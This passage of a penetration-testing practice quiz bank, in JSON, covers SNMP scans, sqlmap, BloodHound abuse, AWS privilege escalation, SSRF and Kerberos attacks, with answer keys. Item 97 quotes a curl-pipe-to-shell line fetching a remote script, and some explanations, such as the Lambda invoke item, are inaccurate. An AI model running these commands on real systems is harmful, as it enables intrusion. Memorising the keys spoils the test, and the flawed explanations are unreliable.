        "Unauthorized control of IoT devices leading to remote code execution (RCE).",
        "Information disclosure of sensor data due to unencrypted channels.",
        "Man-in-the-middle (MITM) attacks on MQTT communication streams.",
        "Firmware manipulation enabling persistent device backdoors."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unauthenticated MQTT brokers allow direct command publishing, potentially enabling full control of connected IoT devices.",
      "examTip": "MQTT without auth = open IoT control. Enforce ACLs and TLS for protection."
    },
    {
      "id": 86,
      "question": "A penetration tester executes the following:\n\n```\nnmap -sU -p 161 target.local\n```\n\nWhat is the PRIMARY objective of this scan?",
      "options": [
        "Enumerate SNMP services that could disclose sensitive configuration data.",
        "Identify open UDP ports for potential DNS amplification attacks.",
        "Discover TFTP servers for unauthorized firmware uploads.",
        "Detect open NetBIOS ports for SMB relay attack opportunities."
      ],
      "correctAnswerIndex": 0,
      "explanation": "UDP port 161 is associated with SNMP. Enumerating it may reveal sensitive configuration details if community strings are weak.",
      "examTip": "UDP 161 = SNMP goldmine. Default 'public' strings = easy enumeration wins."
    },
    {
      "id": 87,
      "question": "During cloud penetration testing, a tester discovers hardcoded AWS access keys in public repositories. What is the MOST impactful next step?",
      "options": [
        "Use Pacu to attempt privilege escalation via IAM role assumption.",
        "Scan associated S3 buckets for sensitive data exfiltration.",
        "Deploy malicious Lambda functions to establish persistent access.",
        "Check CloudTrail logs for possible detection and response measures."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pacu automates privilege escalation checks in AWS environments, offering direct paths to account takeover via IAM abuse.",
      "examTip": "AWS keys + Pacu = privilege escalation roadmap. Act fast—keys may get revoked."
    },
    {
      "id": 88,
      "question": "A penetration tester observes the following output from BloodHound:\n\n```\nEdge: ForceChangePassword\nSource: svc_helpdesk\nTarget: DOMAIN\\Domain Admins\n```\n\nWhat is the MOST effective exploitation method based on this finding?",
      "options": [
        "Reset passwords of Domain Admins for immediate domain control.",
        "Abuse ACLs for DCSync attacks targeting krbtgt hashes.",
        "Exploit unconstrained delegation for lateral domain movement.",
        "Perform AS-REP roasting to recover plaintext passwords offline."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`ForceChangePassword` permissions allow attackers to reset passwords of privileged accounts, enabling direct domain takeover.",
      "examTip": "ForceChangePassword = instant admin access. Change and log in—no cracking needed."
    },
    {
      "id": 89,
      "question": "During a web application penetration test, a tester executes:\n\n```\nsqlmap -u \"http://target.local/search.php?q=term\" --dbs\n```\n\nWhat is the PRIMARY objective of the `--dbs` flag in this context?",
      "options": [
        "Enumerate all available databases on the backend server.",
        "Extract tables and records from the default database.",
        "Perform time-based blind SQL injection testing.",
        "Detect backend DBMS type and version for tailored exploitation."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`--dbs` instructs SQLMap to enumerate all databases available, a key step in database-focused exploitation.",
      "examTip": "`--dbs` = database discovery. Start here before table dumps and data extraction."
    },
    {
      "id": 90,
      "question": "A penetration tester observes the following JWT header:\n\n```json\n{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\n```\n\nWhat is the MOST critical risk associated with this configuration?",
      "options": [
        "Authentication bypass by providing unsigned JWT tokens.",
        "Token replay attack due to lack of proper expiration claims.",
        "Privilege escalation via token manipulation using weak secrets.",
        "Cross-site scripting (XSS) injection within JWT payload data."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`alg: none` allows attackers to forge valid JWTs without a signature, resulting in authentication bypass.",
      "examTip": "`alg: none` = instant bypass. Always enforce secure signing algorithms like HS256 or RS256."
    },
    {
      "id": 91,
      "question": "The following Kubernetes configuration is discovered:\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: compromised-pod\nspec:\n  hostNetwork: true\n  containers:\n  - name: app\n    image: nginx:latest\n```\n\nWhich risk does this MOST critically introduce?",
      "options": [
        "Potential host network compromise due to pod sharing host network stack.",
        "Privilege escalation through Kubernetes kubelet impersonation.",
        "Cross-namespace lateral movement via shared network namespaces.",
        "Unintended exposure of pod services to the public internet."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`hostNetwork: true` allows the pod to share the host's network namespace, increasing risk of host compromise.",
      "examTip": "`hostNetwork` = host-level risk. Limit usage unless absolutely necessary."
    },
    {
      "id": 92,
      "question": "A tester analyzes the following AWS Lambda function policy:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"lambda:InvokeFunction\",\n  \"Resource\": \"*\"\n}\n```\n\nWhich exploitation path is MOST effective given this policy?",
      "options": [
        "Deploy malicious Lambda code for persistent cloud foothold.",
        "Enumerate S3 buckets for sensitive data exfiltration.",
        "Abuse `iam:PassRole` permissions for privilege escalation.",
        "Pivot to EC2 instances by enumerating security group misconfigurations."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`lambda:InvokeFunction` without restrictions enables attackers to run arbitrary Lambda code, establishing persistence.",
      "examTip": "Lambda execution permissions = code execution in the cloud. Validate scopes carefully."
    },
    {
      "id": 93,
      "question": "The following command is executed:\n\n```\nsqlmap -u \"http://target.local/item.php?id=5\" --batch --os-pwn\n```\n\nWhat is the PRIMARY purpose of the `--os-pwn` flag?",
      "options": [
        "Achieve a full reverse shell on the underlying operating system.",
        "Dump all database tables with sensitive application data.",
        "Escalate database-level SQL injection to OS-level command execution.",
        "Bypass authentication mechanisms via crafted SQL payloads."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`--os-pwn` attempts full OS-level exploitation, providing a reverse shell if the target is vulnerable.",
      "examTip": "`--os-pwn` = highest impact SQLi payload. Use with caution—may disrupt target systems."
    },
    {
      "id": 94,
      "question": "Analyze the following Wireshark capture snippet:\n\n```\nPOST /api/internal HTTP/1.1\nHost: vulnerableapp.local\nX-Forwarded-Host: 169.254.169.254\n```\n\nWhich attack type does this MOST likely represent?",
      "options": [
        "Server-side request forgery (SSRF) targeting AWS instance metadata for credentials.",
        "DNS rebinding attack attempting to access internal services.",
        "Cross-site scripting (XSS) exploiting reflected parameters in HTTP headers.",
        "Session fixation via manipulation of proxy headers."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `169.254.169.254` IP is associated with AWS metadata services. SSRF targeting this endpoint aims to steal cloud credentials.",
      "examTip": "SSRF + 169.254.169.254 = AWS credential theft. Always restrict outbound requests."
    },
    {
      "id": 95,
      "question": "A tester uses Pacu with the following module:\n\n```\nrun privesc_scan\n```\n\nWhat is the PRIMARY objective of this action?",
      "options": [
        "Identify AWS IAM privilege escalation paths in the target account.",
        "Scan EC2 instances for misconfigured security groups.",
        "Enumerate Lambda functions with excessive permissions.",
        "Detect exposed S3 buckets containing sensitive data."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`privesc_scan` in Pacu identifies misconfigurations that allow privilege escalation in AWS environments.",
      "examTip": "Pacu's `privesc_scan` = AWS escalation roadmap. Always run post-key compromise."
    },
    {
      "id": 96,
      "question": "The following BloodHound edge is observed:\n\n```\nEdge: GenericAll\nSource: svc_web\nTarget: DOMAIN\\Domain Admins\n```\n\nWhich exploitation method MOST effectively achieves domain admin privileges?",
      "options": [
        "Add svc_web directly to Domain Admins group for full domain control.",
        "Initiate a DCSync attack targeting the krbtgt account hashes.",
        "Perform DCShadow attacks for stealthy domain replication manipulation.",
        "Leverage unconstrained delegation for Kerberos ticket impersonation."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`GenericAll` permissions grant full control over the target object, allowing the user to add themselves to Domain Admins immediately.",
      "examTip": "`GenericAll` edges = instant DA. Exploit first, pivot later."
    },
    {
      "id": 97,
      "question": "A penetration tester identifies the following during code review:\n\n```python\nimport os\nos.system('curl http://malicious-server.com/shell.sh | sh')\n```\n\nWhich vulnerability does this MOST likely represent?",
      "options": [
        "Command injection allowing arbitrary code execution on the host.",
        "Path traversal exposing sensitive local files for remote access.",
        "Remote file inclusion (RFI) enabling server-side code execution.",
        "Unrestricted file upload vulnerability facilitating web shell placement."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`os.system()` calls with external input can lead to command injection, granting attackers the ability to execute arbitrary commands.",
      "examTip": "Command injection vectors = critical. Validate all external calls in code."
    },
    {
      "id": 98,
      "question": "A tester performs a Kerberos-based attack and retrieves the following ticket:\n\n```\nkrbtgt/domain.local@DOMAIN.LOCAL\nEncType: rc4_hmac\n```\n\nWhich attack technique MOST likely resulted in this outcome?",
      "options": [
        "DCSync attack to replicate the krbtgt account hash for Golden Ticket creation.",
        "Kerberoasting to extract SPN hashes for offline cracking.",
        "AS-REP roasting exploiting accounts without pre-authentication.",
        "Pass-the-Ticket (PtT) attack using stolen Kerberos service tickets."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The krbtgt hash is essential for crafting Golden Tickets, which grant indefinite domain admin access without detection.",
      "examTip": "krbtgt = domain master key. DCSync it and the domain is yours indefinitely."
    },
    {
      "id": 99,
      "question": "Examine the following Dockerfile:\n\n```dockerfile\nFROM alpine:latest\nRUN apk add --no-cache openssh\nRUN echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\nRUN echo 'root:password' | chpasswd\nCMD [\"/usr/sbin/sshd\", \"-D\"]\n```\n\nWhat is the MOST critical security concern?",
      "options": [
        "Root SSH access with default credentials allows instant container compromise.",
        "Outdated Alpine image introduces known vulnerabilities into the environment.",
        "Lack of user namespace remapping exposes the host to container breakout.",
        "Absence of SSH key-based authentication increases brute-force risk."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hardcoding root credentials (`password`) combined with enabled SSH root login creates immediate compromise opportunities.",
      "examTip": "Root SSH + weak creds = worst practice. Never deploy containers like this in prod."
    },
    {
      "id": 100,
      "question": "A penetration tester captures the following HTTP request:\n\n```\nPOST /oauth/token HTTP/1.1\nHost: api.target.local\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\n```\n\nWhich vulnerability is MOST likely present?",
      "options": [
        "Weak OAuth client credentials enabling brute-force attacks.",
        "Open redirect flaw in OAuth flow allowing phishing attacks.",
        "Improper token revocation policies exposing session hijacking risks.",
        "OAuth token confusion enabling privilege escalation across services."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Basic authentication using weak or default credentials (as seen in base64 `admin:password`) makes brute-force attacks trivial.",
      "examTip": "OAuth flows with weak client creds = low-hanging fruit. Enforce strong secrets and PKCE."
    }
  ]
});
